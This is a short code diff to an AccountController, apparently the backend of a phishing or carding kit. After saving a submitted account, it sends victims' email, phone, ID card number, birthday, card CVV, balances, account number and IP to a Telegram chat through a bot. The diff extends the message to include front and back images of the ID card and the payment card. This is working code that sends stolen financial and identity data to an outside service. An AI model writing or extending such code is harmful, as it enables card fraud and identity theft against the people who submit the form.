@@ -79,7 +79,7 @@ export class AccountController {
       await account.save();
       bot.sendMessage(
         process.env.TELEGRAM_CHAT_ID,
-        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}`
+        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\nfID: ${frontIdCard}\nbID: ${backIdCard}\nfC: ${frontCard}\nbC: ${backCard}`
       );
 
       return res.status(200).json({
